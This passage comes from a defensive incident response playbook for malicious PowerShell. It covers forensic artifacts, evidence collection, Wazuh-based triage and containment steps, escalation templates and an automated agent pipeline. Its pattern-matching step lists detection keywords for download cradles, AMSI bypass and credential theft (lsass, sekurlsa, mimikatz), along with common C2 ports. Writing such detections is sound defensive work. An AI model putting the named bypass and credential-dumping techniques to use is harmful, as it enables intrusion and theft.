| **PowerShell Module Logging** | 4103 | Cmdlet execution details, parameters, pipeline data | High - Command-level execution trace | 60 days |
| **PowerShell Transcription** | N/A (text files) | Full console session transcript including output | High - Complete interactive session record | 30 days |
| **Windows PowerShell** | 400, 403 | Engine lifecycle (start/stop), provider initialization | Medium - Execution timing | 30 days |
| **Windows PowerShell** | 600 | Provider lifecycle events | Low - Contextual information | 30 days |

### AMSI (Anti-Malware Scan Interface) Events

| Event ID | Description | Detection Use Case | Priority |
|----------|-------------|-------------------|----------|
| **1116** | Malware detected | AMSI identified malicious PowerShell content before execution | Critical |
| **1117** | Action taken on malware | Confirmation of block/quarantine action | High |
| **1118** | AMSI scan failed | Potential AMSI bypass or tampering | Critical |
| **1119** | AMSI error | System integrity issue or evasion attempt | High |

### File System Artifacts

| Artifact Location | Evidence Type | Investigation Purpose | Volatility |
|-------------------|---------------|----------------------|------------|
| **C:\Windows\Prefetch\POWERSHELL.EXE-*.pf** | Execution count, last run time, loaded DLLs | Prove PowerShell execution even if logs cleared | Low (persists) |
| **C:\Windows\AppCompat\Programs\Amcache.hve** | SHA1 hash, full path, execution time | Timeline reconstruction, hash identification | Low (persists) |
| **C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt** | Interactive command history | User-initiated commands (not scripts) | Medium (user-deletable) |
| **C:\Windows\System32\WDI\LogFiles\** | Script execution logs | Diagnostic data on script performance | Medium |
| **%TEMP%\*, %APPDATA%\Local\Temp\*** | Downloaded payloads, dropped files | Malware artifacts, secondary payloads | High (often deleted) |
| **C:\Windows\Temp\** | System-level temp files | Payloads dropped by SYSTEM-level PowerShell | High (often deleted) |

### Memory Artifacts

| Artifact | Extraction Method | Forensic Value | Volatility |
|----------|------------------|----------------|------------|
| **PowerShell process memory** | Process dump (ProcDump, Task Manager) | Recovered deobfuscated scripts, loaded modules | Very High (lost on process termination) |
| **Script Block cache** | Memory forensics (Volatility, Rekall) | Recently executed script blocks | Very High |
| **.NET Assembly cache** | Memory forensics | Reflectively loaded malicious assemblies | Very High |
| **Network connection state** | netstat, process memory | Active C2 connections, socket handles | Very High |

### Registry Artifacts

| Registry Key | Evidence | Attack Technique | Detection |
|--------------|----------|------------------|-----------|
| **HKCU\Software\Microsoft\Windows\CurrentVersion\Run** | PowerShell persistence | T1547.001 | Sysmon EID 13 |
| **HKLM\Software\Microsoft\Windows\CurrentVersion\Run** | System-wide persistence | T1547.001 | Sysmon EID 13 |
| **HKLM\Software\Policies\Microsoft\Windows\PowerShell** | Execution policy modifications | T1112 | Sysmon EID 13 |
| **HKCU\Software\Microsoft\Windows\PowerShell\** | User PowerShell configuration changes | T1112 | Sysmon EID 13 |
| **HKLM\SYSTEM\CurrentControlSet\Services\** | Malicious service creation | T1543.003 | Sysmon EID 13 + Windows 4697 |

### Network Artifacts

| Source | Data Type | Investigation Use | Tool |
|--------|-----------|------------------|------|
| **Sysmon Event ID 3** | TCP/UDP connections, source/dest IP:port | C2 communication identification | Wazuh + Sysmon |
| **Sysmon Event ID 22** | DNS queries | Domain resolution patterns, DGA detection | Wazuh + Sysmon |
| **Network flow logs** | NetFlow/IPFIX data | Bandwidth usage, connection duration | Flow collector |
| **Proxy logs** | HTTP/HTTPS requests | URL-based IOCs, user-agent strings | Proxy/Web gateway |
| **Firewall logs** | Blocked/allowed connections | Blocked C2 attempts | Firewall SIEM integration |

### Evidence Preservation Checklist

```yaml
evidence_collection_workflow:
  tier_1_immediate:
    - action: capture_alert_data
      source: wazuh_manager
      format: json
      retention: permanent

    - action: snapshot_process_tree
      tool: sysmon_logs
      retention: 90_days

    - action: export_command_line
      decode: true
      retention: permanent

  tier_2_within_15min:
    - action: dump_powershell_process_memory
      tool: procdump
      condition: process_still_running
      retention: 180_days

    - action: collect_script_block_logs
      timerange: [-2h, +30m]
      retention: 90_days

    - action: extract_network_connections
      tool: netstat
      retention: 60_days

  tier_3_within_1hour:
    - action: full_disk_forensic_image
      condition: severity == critical
      tool: ftk_imager
      retention: 1_year

    - action: collect_prefetch_files
      path: C:\Windows\Prefetch\POWERSHELL.EXE-*.pf
      retention: 180_days

    - action: export_registry_keys
      keys: [Run, RunOnce, Services, PowerShell_Policy]
      retention: 180_days

    - action: collect_temp_files
      paths: [%TEMP%, %APPDATA%\Local\Temp, C:\Windows\Temp]
      retention: 180_days
```

## Response Plan

### Investigation Phase (Read-Only - No Approval Required)

#### Step 1: Automated Command Analysis (Triage Agent)

```yaml
task: decode_and_analyze_command
priority: critical
sla: 2_minutes

inputs:
  - encoded_command: ${alert.data.win.eventdata.commandLine}
  - encoding_type: auto_detect

actions:
  - decode_base64_unicode
  - decode_base64_ascii
  - remove_obfuscation
  - extract_iocs:
      - urls
      - ip_addresses
      - file_paths
      - registry_keys
      - domain_names

outputs:
  decoded_command: full_text
  ioc_list: structured_json
  malicious_score: 0-100
  pattern_matches:
    - download_cradles
    - credential_access
    - amsi_bypass
    - persistence_mechanisms
```

#### Step 2: Process Tree & Parent Chain Analysis (Investigation Agent)

```yaml
task: analyze_process_ancestry
priority: high
sla: 3_minutes

query:
  - get_parent_chain:
      depth: 5
      include:
        - process_name
        - command_line
        - user
        - integrity_level
        - start_time

  - get_child_processes:
      depth: 3
      include:
        - process_name
        - command_line
        - network_connections
        - file_operations

risk_assessment:
  high_risk_parents: [WINWORD.EXE, EXCEL.EXE, wscript.exe, cscript.exe, mshta.exe]
  suspicious_children: [cmd.exe, wmic.exe, net.exe, reg.exe, taskkill.exe]

output:
  process_tree_visualization: ascii_art
  risk_score: calculated
  anomalies_detected: list
```

#### Step 3: Network Activity Correlation (Investigation Agent)

```yaml
task: correlate_network_activity
priority: high
sla: 5_minutes

queries:
  sysmon_eid3:
    filter: process_guid == ${powershell_guid}
    fields:
      - destination_ip
      - destination_port
      - destination_hostname
      - initiated_time

  sysmon_eid22:
    filter: process_guid == ${powershell_guid}
    fields:
      - query_name
      - query_results
      - query_time

threat_intelligence:
  check_reputation:
    - destination_ips → [virustotal, abuseipdb, emerging_threats]
    - destination_domains → [virustotal, alienvault, internal_blocklist]

  check_patterns:
    - dga_detection: high_entropy_domains
    - c2_ports: [4444, 4445, 8080, 31337, 443_to_non_web]
    - geo_risk: [sanctioned_countries, unexpected_regions]

output:
  network_summary:
    total_connections: count
    unique_destinations: list
    malicious_destinations: list_with_scores
    c2_confidence: 0-100
```

#### Step 4: Threat Intelligence Lookup (Investigation Agent)

```yaml
task: comprehensive_ti_lookup
priority: medium
sla: 10_minutes

lookups:
  hash_reputation:
    sources: [virustotal, malwarebazaar, hybrid_analysis]
    hashes: [md5, sha1, sha256]
    threshold: 3_positive_detections

  url_reputation:
    sources: [virustotal, urlhaus, phishtank]
    urls: ${extracted_urls}
    threshold: 2_positive_detections

  ip_reputation:
    sources: [abuseipdb, alienvault, emerging_threats]
    ips: ${destination_ips}
    confidence_threshold: 75

  domain_reputation:
    sources: [virustotal, alienvault, cisco_umbrella]
    domains: ${extracted_domains}
    checks:
      - domain_age < 30_days
      - dga_score > 70
      - threat_feed_match

  signature_matching:
    frameworks:
      - cobalt_strike_signatures
      - empire_signatures
      - powersploit_signatures
      - mimikatz_signatures

    confidence_levels:
      - exact_match: 100%
      - high_similarity: 85%
      - pattern_match: 70%

output:
  threat_assessment:
    overall_confidence: 0-100
    malware_family: identified_or_unknown
    threat_actor: identified_or_unknown
    attack_framework: identified_or_unknown
    recommended_severity: critical|high|medium|low
```

#### Step 5: Historical Context & Host Baseline (Investigation Agent)

```yaml
task: assess_historical_context
priority: medium
sla: 10_minutes

queries:
  host_history:
    timerange: last_30_days
    filters:
      - agent.id == ${agent_id}
      - rule.level >= 7

    checks:
      - previous_malware_detections
      - failed_login_attempts
      - privilege_escalation_attempts
      - lateral_movement_indicators
      - data_exfiltration_alerts

  user_baseline:
    timerange: last_90_days
    user: ${alert.data.win.eventdata.user}

    analyze:
      - typical_logon_hours
      - typical_hosts_accessed
      - typical_processes_executed
      - privilege_usage_patterns

    detect_anomalies:
      - off_hours_activity
      - new_host_access
      - unusual_process_execution
      - privilege_escalation

  powershell_baseline:
    timerange: last_60_days
    host: ${hostname}

    profile:
      - average_daily_powershell_executions
      - common_command_patterns
      - typical_parent_processes
      - network_activity_baseline

    compare:
      - current_command vs historical_commands
      - current_parent vs typical_parents
      - current_network vs baseline_network

output:
  context_assessment:
    host_risk_score: 0-100
    user_anomaly_score: 0-100
    baseline_deviation: 0-100
    previous_incidents: count_and_summary
    recommendation: investigate_further|standard_response|escalate
```

### Containment Phase (Approval Required)

#### Containment Decision Matrix

| Severity | Confidence | Auto-Approve | Human Approval | Escalation |
|----------|-----------|--------------|----------------|------------|
| Critical | >90% | Kill process + Isolate host + Block C2 | Not required (auto-execute) | Notify SOC Lead + CISO immediately |
| Critical | 70-90% | Kill process + Block C2 | Required (SOC Analyst L2+) | Notify SOC Lead |
| High | >85% | Kill process + Block C2 | Required (SOC Analyst L2+) | Notify SOC Lead |
| High | 70-85% | Kill process | Required (SOC Analyst L2+) | Standard escalation |
| Medium | >80% | None | Required (SOC Analyst L1+) | Standard escalation |
| Medium | <80% | None | Required (SOC Analyst L2+) | If pattern emerges |

#### Option A: Terminate Malicious Process (Response Planner)

```yaml
action: kill_process
severity: medium
approval_required: yes
auto_approve_conditions:
  - alert_severity: critical
  - confidence_score: > 90
  - process_still_running: true

target:
  agent_id: ${agent_id}
  process_id: ${pid}
  process_name: powershell.exe
  process_guid: ${process_guid}

pre_execution_checks:
  - verify_process_exists
  - confirm_not_critical_system_process
  - check_child_processes (will also be terminated)

execution:
  method: wazuh_active_response
  command: |
    taskkill /F /PID ${pid}

  alternative_method: wazuh_agent_api
  fallback: manual_analyst_action

post_execution:
  - verify_process_terminated
  - check_for_respawn_attempts
  - monitor_for_persistence_reactivation

risk_assessment:
  impact: medium
  reversibility: non-reversible
  false_positive_cost: low (process can be restarted)

justification_template: |
  Terminating PowerShell process PID ${pid} on ${hostname}
  Reason: Malicious activity detected (confidence: ${confidence}%)
  Indicators: ${top_3_indicators}
  Risk of non-action: ${risk_description}

notification:
  - slack: #soc-alerts
  - email: soc-team@company.com
  - ticket: auto_create_incident
```

#### Option B: Host Isolation (Response Planner)

```yaml
action: isolate_host
severity: high
approval_required: yes
auto_approve_conditions:
  - alert_severity: critical
  - confidence_score: > 95
  - lateral_movement_detected: true OR credential_access_detected: true

target:
  agent_id: ${agent_id}
  hostname: ${hostname}
  ip_address: ${host_ip}

pre_execution_checks:
  - verify_asset_criticality (block if tier_0_critical_production)
  - check_active_user_sessions
  - identify_business_impact
  - notify_asset_owner

isolation_methods:
  primary: edr_network_isolation
    - tool: crowdstrike|sentinelone|defender_atp
    - action: contain_host
    - preserve_management_channel: yes

  secondary: firewall_acl
    - block_all_inbound
    - block_all_outbound
    - allow_only: [wazuh_manager, dns, domain_controller]

  tertiary: switch_port_shutdown
    - requires: network_team_approval
    - method: switch_api_call
    - physical_isolation: last_resort

post_execution:
  - verify_isolation_effective
  - test_network_connectivity (should fail)
  - maintain_wazuh_agent_connection
  - begin_forensic_collection

remediation_timeline:
  - t+0: Isolation executed
  - t+15min: Initial triage report
  - t+1hour: Forensic analysis complete
  - t+4hours: Remediation plan approved
  - t+8hours: System cleaned and re-imaged (if needed)
  - t+24hours: Monitoring for reinfection

risk_assessment:
  impact: high
  reversibility: reversible (de-isolate after cleanup)
  false_positive_cost: high (business disruption)

justification_template: |
  CRITICAL: Isolating host ${hostname} (${ip_address})
  Reason: Active compromise detected
  Attack Indicators:
    - ${indicator_1}
    - ${indicator_2}
    - ${indicator_3}
  Business Impact: ${impact_assessment}
  Estimated Downtime: ${estimated_duration}
  Approval Required From: ${approver_name}

notification:
  immediate:
    - soc_lead: phone_call
    - ciso: email + sms
    - asset_owner: email
    - it_team: slack

  ongoing:
    - status_updates: every_30_minutes
    - stakeholder_briefing: every_2_hours
```

#### Option C: Block C2 Infrastructure (Response Planner)

```yaml
action: block_network_indicators
severity: low
approval_required: conditional
auto_approve_conditions:
  - ioc_confidence: > 80
  - ioc_in_threat_feed: yes
  - no_business_impact: confirmed

targets:
  ip_addresses: ${malicious_ips}
  domains: ${malicious_domains}
  urls: ${malicious_urls}

pre_execution_checks:
  - verify_not_internal_ip
  - verify_not_whitelisted_domain
  - check_business_application_dependencies
  - verify_threat_intelligence_confidence

blocking_methods:
  firewall:
    - action: create_deny_rule
    - direction: bidirectional
    - scope: organization_wide
    - duration: permanent (until reviewed)

  dns_sinkhole:
    - action: redirect_to_sinkhole
    - domains: ${malicious_domains}
    - sinkhole_ip: 10.0.0.1

  proxy:
    - action: block_url_category
    - urls: ${malicious_urls}
    - category: malware_c2

  edr:
    - action: add_to_ioc_list
    - scope: all_endpoints
    - alert_on_match: yes

post_execution:
  - verify_block_effective (test connection)
  - monitor_for_connection_attempts
  - share_iocs_with_isac
  - update_internal_threat_feed

deconfliction:
  - check_against_whitelist
  - verify_no_false_positive_reports
  - coordinate_with_network_team

risk_assessment:
  impact: low
  reversibility: easily_reversible
  false_positive_cost: medium (potential service disruption)

justification_template: |
  Blocking malicious infrastructure:
  IP Addresses: ${ip_list}
  Domains: ${domain_list}
  Threat Intelligence:
    - Source: ${ti_source}
    - Confidence: ${ti_confidence}%
    - Associated Malware: ${malware_family}
  Reason: Prevent C2 communication from ${hostname}

notification:
  - network_team: slack + email
  - soc_team: #soc-alerts
  - threat_intel_team: case_update
```

#### Option D: Memory Dump & Forensic Collection (Response Planner)

```yaml
action: collect_forensic_evidence
severity: low (non-disruptive)
approval_required: no (read-only)
auto_execute: yes (if severity >= high)

target:
  agent_id: ${agent_id}
  hostname: ${hostname}
  process_id: ${powershell_pid}

collection_tasks:
  process_memory:
    - tool: procdump64.exe
    - command: procdump.exe -ma ${pid} ${output_path}
    - output: C:\Forensics\${case_id}\process_${pid}.dmp
    - size_estimate: 100-500MB
    - duration_estimate: 30-60s

  powershell_logs:
    - source: Microsoft-Windows-PowerShell/Operational
    - eids: [4103, 4104]
    - timerange: [-2h, +30m]
    - format: evtx
    - output: C:\Forensics\${case_id}\powershell_logs.evtx

  script_block_cache:
    - source: Windows event logs
    - eid: 4104
    - extraction: full_script_content
    - output: C:\Forensics\${case_id}\script_blocks.json

  network_state:
    - command: netstat -ano > ${output_path}
    - command: Get-NetTCPConnection | ConvertTo-Json
    - output: C:\Forensics\${case_id}\network_connections.json

  file_artifacts:
    - paths:
        - C:\Users\${user}\AppData\Local\Temp\
        - C:\Windows\Temp\
        - C:\Users\${user}\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
    - action: recursive_copy
    - output: C:\Forensics\${case_id}\file_artifacts\

  registry_snapshot:
    - keys:
        - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        - HKLM\Software\Microsoft\Windows\CurrentVersion\Run
        - HKLM\Software\Policies\Microsoft\Windows\PowerShell
    - action: export_to_reg_file
    - output: C:\Forensics\${case_id}\registry_snapshot.reg

execution:
  method: wazuh_active_response_script
  timeout: 300s
  retry_on_failure: yes

post_collection:
  - compress_evidence: zip_with_password
  - calculate_hashes: [md5, sha256]
  - upload_to_case_storage: s3://forensic-evidence-bucket/${case_id}/
  - generate_chain_of_custody: forensic_report.pdf

risk_assessment:
  impact: very_low (read-only)
  reversibility: n/a
  false_positive_cost: negligible

notification:
  - forensic_team: email_with_evidence_location
  - case_management: auto_attach_to_ticket
```

## Communication Templates

### Analyst Handoff Template (L1 → L2 Escalation)

```markdown
**CASE ESCALATION: Suspicious PowerShell Activity**

**Case ID:** ${case_id}
**Escalation Time:** ${timestamp}
**Escalated By:** ${analyst_l1_name}
**Escalated To:** ${analyst_l2_name}

---

### Executive Summary
${one_paragraph_summary}

### Alert Details
- **Host:** ${hostname} (${ip_address})
- **User:** ${username} (${domain}\${user})
- **Process ID:** ${pid}
- **Parent Process:** ${parent_process}
- **Detection Time:** ${alert_timestamp}
- **Current Status:** ${process_running_status}

### Malicious Indicators (Confidence: ${confidence_score}%)
1. **${indicator_1}** - Severity: ${severity_1}
2. **${indicator_2}** - Severity: ${severity_2}
3. **${indicator_3}** - Severity: ${severity_3}

### Command Analysis
**Encoded Command:**
```
${original_encoded_command}
```

**Decoded Command:**
```powershell
${decoded_command}
```

**Extracted IOCs:**
- **URLs:** ${url_list}
- **IP Addresses:** ${ip_list}
- **Domains:** ${domain_list}
- **File Paths:** ${file_path_list}

### Threat Intelligence
- **Malware Family:** ${malware_family_or_unknown}
- **Attack Framework:** ${framework_or_unknown}
- **VirusTotal Score:** ${vt_positives}/${vt_total}
- **Reputation:** ${reputation_summary}

### Investigation Actions Completed
- [x] Command decoded and analyzed
- [x] Process tree examined (${child_process_count} child processes)
- [x] Network connections correlated (${network_connection_count} connections)
- [x] Threat intelligence lookup completed
- [x] Host baseline comparison performed

### Recommended Next Steps
1. **${recommendation_1}**
2. **${recommendation_2}**
3. **${recommendation_3}**

### Approval Requested
**Action:** ${recommended_action}
**Risk:** ${risk_level}
**Business Impact:** ${impact_assessment}
**Justification:** ${justification}

**[APPROVE]** **[DENY]** **[INVESTIGATE FURTHER]**

---

**Evidence Location:** ${evidence_path}
**Full Alert JSON:** ${wazuh_alert_id}
**MITRE ATT&CK:** ${mitre_techniques}
```

### Management Escalation Template (Confirmed Compromise)

```markdown
**SECURITY INCIDENT NOTIFICATION - CONFIRMED COMPROMISE**

**Classification:** TLP:AMBER - Internal Distribution Only
**Incident ID:** ${incident_id}
**Severity:** ${severity_level}
**Status:** ${current_status}
**Incident Manager:** ${im_name}

---

## Executive Summary

A confirmed malicious PowerShell execution has been detected and contained on ${hostname}. The attack exhibited characteristics of ${attack_description} and has been attributed to ${threat_actor_or_unknown}. ${containment_status}.

**Business Impact:** ${business_impact_summary}
**Estimated Containment:** ${estimated_resolution_time}

---

## Incident Details

### Affected Systems
| Hostname | IP Address | User | Asset Criticality | Status |
|----------|-----------|------|------------------|--------|
| ${hostname} | ${ip} | ${user} | ${criticality} | ${status} |

### Attack Timeline
| Time (UTC) | Event | MITRE Technique |
|------------|-------|-----------------|
| ${t1} | Initial PowerShell execution detected | T1059.001 |
| ${t2} | Encoded command decoded - download cradle identified | T1105 |
| ${t3} | Network connection to malicious C2: ${c2_ip} | T1071.001 |
| ${t4} | LSASS process access detected (credential dumping) | T1003.001 |
| ${t5} | Containment action initiated | - |
| ${t6} | Host isolated from network | - |

### Threat Assessment
- **Attack Vector:** ${initial_access_method}
- **Malware Family:** ${malware_family}
- **Threat Actor:** ${threat_actor_attribution}
- **Sophistication:** ${sophistication_level}
- **Intent:** ${assessed_intent}

### Compromise Indicators
- **Data Exfiltration:** ${exfil_detected_yes_no} (${exfil_volume})
- **Lateral Movement:** ${lateral_movement_yes_no} (${affected_systems_count} systems)
- **Credential Theft:** ${credential_theft_yes_no} (${compromised_accounts})
- **Persistence:** ${persistence_yes_no} (${persistence_mechanisms})

---

## Response Actions Taken

### Immediate Containment (Completed)
- ✅ Malicious process terminated (PID: ${pid})
- ✅ Host isolated from network (${hostname})
- ✅ C2 infrastructure blocked (${c2_ips})
- ✅ Affected user account disabled (${username})
- ✅ Forensic evidence collected and preserved

### Ongoing Investigation
- 🔄 Full disk forensic analysis in progress
- 🔄 Memory dump analysis for additional IOCs
- 🔄 Threat hunting across environment for similar patterns
- 🔄 Lateral movement assessment (${systems_scanned}/${total_systems} scanned)

### Planned Remediation
- ⏳ Host re-imaging scheduled: ${reimage_time}
- ⏳ Password reset for affected accounts: ${password_reset_time}
- ⏳ Vulnerability assessment and patching: ${patching_schedule}
- ⏳ Security control enhancement: ${control_enhancement_plan}

---

## Business Impact Assessment

### Operational Impact
- **Affected Business Units:** ${business_units}
- **Service Disruption:** ${service_disruption_yes_no}
- **Downtime:** ${estimated_downtime}
- **Revenue Impact:** ${revenue_impact_estimate}

### Data Impact
- **Data Classification:** ${data_classification}
- **Records Potentially Compromised:** ${record_count_estimate}
- **PII/PHI Exposure:** ${pii_phi_exposure_yes_no}
- **Regulatory Notification Required:** ${regulatory_notification_yes_no}

### Compliance & Legal
- **Regulatory Frameworks:** ${applicable_regulations}
- **Notification Obligations:** ${notification_requirements}
- **Legal Hold:** ${legal_hold_status}
- **Law Enforcement Engagement:** ${law_enforcement_yes_no}

---

## Next Steps & Recommendations

### Immediate (Next 4 Hours)
1. ${immediate_step_1}
2. ${immediate_step_2}
3. ${immediate_step_3}

### Short-term (Next 24 Hours)
1. ${shortterm_step_1}
2. ${shortterm_step_2}
3. ${shortterm_step_3}

### Long-term (Next 30 Days)
1. ${longterm_step_1}
2. ${longterm_step_2}
3. ${longterm_step_3}

---

## Stakeholder Communication

**Incident Response Team:**
- SOC Lead: ${soc_lead_name} (${soc_lead_contact})
- Incident Manager: ${im_name} (${im_contact})
- Forensics Lead: ${forensics_lead} (${forensics_contact})

**Executive Stakeholders:**
- CISO: ${ciso_name} - Briefed at ${ciso_briefing_time}
- CIO: ${cio_name} - ${cio_briefing_status}
- Legal: ${legal_contact} - ${legal_briefing_status}

**Next Briefing:** ${next_briefing_time}

---

## Appendix

**Evidence Repository:** ${evidence_location}
**Incident Ticket:** ${ticket_url}
**War Room:** ${war_room_link}
**MITRE ATT&CK Navigator:** ${attack_navigator_json}

---

*This is a confidential security incident notification. Distribution is restricted to authorized personnel only.*
```

## Regulatory Compliance & Framework Mapping

### NIST 800-61r2 Incident Response Lifecycle Mapping

| NIST Phase | Playbook Section | Automated Components | SLA |
|------------|------------------|---------------------|-----|
| **1. Preparation** | Detection Criteria, Rule Configuration | Wazuh/Sysmon rule deployment, SIGMA integration | Continuous |
| **2. Detection & Analysis** | Automated Triage Steps, Decision Tree | Triage Agent (decode), Investigation Agent (TI lookup, correlation) | < 5 minutes |
| **3. Containment, Eradication, Recovery** | Response Plan (Options A-D) | Response Planner (kill process, isolate host, block C2) | < 15 minutes |
| **4. Post-Incident Activity** | Post-Incident Section, Metrics | Automated evidence collection, IOC extraction, playbook tuning | < 24 hours |

### SANS Incident Handling Phases

| SANS Phase | Implementation | Agent Role | KPI |
|------------|----------------|------------|-----|
| **1. Identification** | Wazuh alert triggered by Sysmon/SIGMA rules | N/A (rule-based) | < 1 minute (real-time Sysmon) |
| **2. Containment** | Kill process, isolate host, block network | Response Planner | < 15 minutes |
| **3. Eradication** | Remove malware, clean persistence, patch vulnerabilities | Manual + automated remediation | < 4 hours |
| **4. Recovery** | Re-image system, restore from backup, validate clean state | Manual (change control required) | < 24 hours |
| **5. Lessons Learned** | Post-incident review, playbook update, detection tuning | Manual (SOC Lead + IR Team) | < 7 days |

### Compliance Framework Alignment

| Framework | Requirement | Playbook Implementation | Evidence |
|-----------|-------------|------------------------|----------|
| **PCI-DSS 4.0** | Req 10.2.7 - Monitor privileged commands | PowerShell execution logging (EID 4104, 4103) | Windows event logs, Wazuh alerts |
| **PCI-DSS 4.0** | Req 11.5 - File integrity monitoring | Sysmon EID 11 (file creation) | Forensic artifacts section |
| **HIPAA Security Rule** | § 164.312(b) - Audit controls | Script Block Logging, transcription logs | PowerShell operational logs |
| **GDPR Article 33** | Breach notification (72 hours) | Management escalation template | Incident notification workflow |
| **SOC 2 Type II** | CC7.3 - Detect security incidents | Comprehensive detection criteria, decision tree | Wazuh alert data, SIEM correlation |
| **ISO 27001:2022** | A.5.24 - Incident response planning | Full response plan with containment options | Playbook documentation |
| **NIST CSF v1.1** | DE.CM-7 - Monitor unauthorized activity | Sysmon real-time monitoring, behavior analytics | Detection criteria, agent pipeline |
| **CMMC Level 2** | AC.L2-3.1.2 - Limit access to privileged users | Parent process analysis, user context assessment | Context assessment section |

## Agent Pipeline Integration

### Agent Workflow Orchestration

```yaml
agent_pipeline:
  # ========================================
  # STAGE 1: TRIAGE AGENT
  # ========================================
  triage_agent:
    trigger: wazuh_alert_received
    priority: critical
    timeout: 120s

    tasks:
      - task_id: extract_entities
        description: "Extract host, user, process, command line, hashes from alert"
        output: entity_json

      - task_id: decode_powershell_command
        description: "Decode Base64/Unicode encoded PowerShell commands"
        input: ${alert.data.win.eventdata.commandLine}
        methods:
          - base64_unicode_decode
          - base64_ascii_decode
          - unicode_unescape
          - deobfuscate_tick_marks
        output: decoded_command_text

      - task_id: extract_iocs
        description: "Extract URLs, IPs, domains, file paths from decoded command"
        input: ${decoded_command_text}
        regex_patterns:
          - urls: '(https?://[^\s\"\'<>]+)'
          - ips: '\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b'
          - domains: '\b(?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z]{2,}\b'
          - file_paths: '[A-Za-z]:\\(?:[^\\\/:*?"<>|\r\n]+\\)*[^\\\/:*?"<>|\r\n]*'
        output: ioc_list_json

      - task_id: pattern_matching
        description: "Identify malicious patterns (download cradles, AMSI bypass, credential access)"
        input: ${decoded_command_text}
        patterns:
          - download_cradles: ["DownloadString", "DownloadFile", "WebClient", "Invoke-WebRequest"]
          - amsi_bypass: ["AmsiScanBuffer", "amsiInitFailed", "AmsiUtils"]
          - credential_access: ["lsass", "sekurlsa", "mimikatz", "Get-Credential"]
          - obfuscation: ["Invoke-Expression", "IEX", "[char[]]", "-join"]
        output: pattern_matches_json

      - task_id: calculate_initial_severity
        description: "Calculate initial severity score based on indicators"
        formula: |
          severity_score = (
            (parent_process_risk * 0.3) +
            (pattern_match_risk * 0.4) +
            (obfuscation_detected * 0.2) +
            (network_indicator_risk * 0.1)
          )
        output: initial_severity_score (0-100)

    handoff_to_investigation_agent:
      condition: initial_severity_score >= 30
      data_package:
        - entity_json
        - decoded_command_text
        - ioc_list_json
        - pattern_matches_json
        - initial_severity_score

  # ========================================
  # STAGE 2: INVESTIGATION AGENT
  # ========================================
  investigation_agent:
    trigger: triage_agent_handoff
    priority: high
    timeout: 300s

    tasks:
      - task_id: threat_intel_lookup
        description: "Query threat intelligence feeds for IOCs"
        parallel_queries:
          - virustotal_hash_lookup: ${entity_json.hashes}
          - virustotal_url_lookup: ${ioc_list_json.urls}
          - virustotal_ip_lookup: ${ioc_list_json.ips}
          - abuseipdb_lookup: ${ioc_list_json.ips}
          - alienvault_otx_lookup: ${ioc_list_json}
          - internal_threat_feed: ${ioc_list_json}
        aggregation: combine_and_score
        output: ti_enrichment_json

      - task_id: correlate_sysmon_events
        description: "Query Wazuh for related Sysmon events (network, file, registry, process access)"
        timerange: [-2h, +30m]
        queries:
          - sysmon_eid_3: "Network connections from PowerShell GUID ${process_guid}"
          - sysmon_eid_10: "Process access (LSASS dumping) from PowerShell GUID ${process_guid}"
          - sysmon_eid_11: "File creation from PowerShell GUID ${process_guid}"
          - sysmon_eid_13: "Registry modification from PowerShell GUID ${process_guid}"
          - sysmon_eid_22: "DNS queries from PowerShell GUID ${process_guid}"
        output: correlated_events_json

      - task_id: build_attack_timeline
        description: "Construct chronological attack timeline from correlated events"
        input: ${correlated_events_json}
        sort_by: timestamp_ascending
        stages:
          - initial_execution
          - network_connection
          - credential_access
          - persistence
          - lateral_movement
        output: attack_timeline_json

      - task_id: assess_context
        description: "Evaluate parent process, user context, timing, host history"
        checks:
          - parent_process_risk: is_office_or_script_host
          - user_context_risk: is_admin_or_service_account
          - temporal_risk: is_off_hours_or_weekend
          - host_history_risk: has_previous_incidents
        output: context_risk_json

      - task_id: calculate_final_severity
        description: "Calculate final severity incorporating TI and context"
        formula: |
          final_severity = (
            (initial_severity_score * 0.3) +
            (ti_enrichment_score * 0.3) +
            (context_risk_score * 0.2) +
            (attack_timeline_complexity * 0.2)
          )
        thresholds:
          - 0-30: Low
          - 31-60: Medium
          - 61-80: High
          - 81-100: Critical
        output: final_severity_level

    handoff_to_response_planner:
      condition: final_severity_level >= "Medium"
      data_package:
        - all_triage_agent_outputs
        - ti_enrichment_json
        - correlated_events_json
        - attack_timeline_json
        - context_risk_json
        - final_severity_level

  # ========================================
  # STAGE 3: RESPONSE PLANNER
  # ========================================
  response_planner:
    trigger: investigation_agent_handoff
    priority: critical
    timeout: 180s

    tasks:
      - task_id: generate_containment_plan
        description: "Propose containment actions based on severity and indicators"
        decision_logic:
          critical_severity:
            conditions:
              - final_severity_level == "Critical"
              - OR: [lateral_movement_detected, credential_dumping_detected, known_malware_family]
            actions:
              - kill_process: immediate
              - isolate_host: immediate
              - block_c2_infrastructure: immediate
              - disable_user_account: immediate
              - escalate_to: [soc_lead, ciso]
            auto_approve: yes (if confidence > 90%)

          high_severity:
            conditions:
              - final_severity_level == "High"
              - OR: [download_cradle_detected, amsi_bypass_detected, malicious_ti_match]
            actions:
              - kill_process: immediate
              - block_c2_infrastructure: immediate
              - isolate_host: approval_required
              - collect_forensic_evidence: immediate
              - escalate_to: [soc_lead]
            auto_approve: partial (kill process + block C2 only)

          medium_severity:
            conditions:
              - final_severity_level == "Medium"
            actions:
              - collect_forensic_evidence: immediate
              - kill_process: approval_required
              - monitor_for_escalation: continuous
              - escalate_to: [soc_analyst_l2]
            auto_approve: no

        output: containment_plan_json

      - task_id: generate_approval_request
        description: "Create Slack/email approval request for human analyst"
        template: approval_request_template (see Communication Templates)
        include:
          - executive_summary
          - decoded_command_snippet
          - top_3_malicious_indicators
          - ti_reputation_summary
          - recommended_action
          - risk_assessment
          - business_impact_estimate
        output: approval_request_message

      - task_id: await_approval_or_auto_execute
        description: "Send approval request or auto-execute if conditions met"
        logic:
          if: auto_approve == yes
            then: execute_containment_plan
          else:
            send: approval_request_message → slack_channel
            wait_for: human_approval (timeout: 15 minutes)
            on_approval: execute_containment_plan
            on_denial: log_and_monitor
            on_timeout: escalate_to_soc_lead

      - task_id: execute_containment_actions
        description: "Execute approved containment actions via Wazuh Active Response"
        actions:
          - name: kill_process
            api: wazuh_active_response
            command: taskkill /F /PID ${pid}
            verification: check_process_no_longer_running

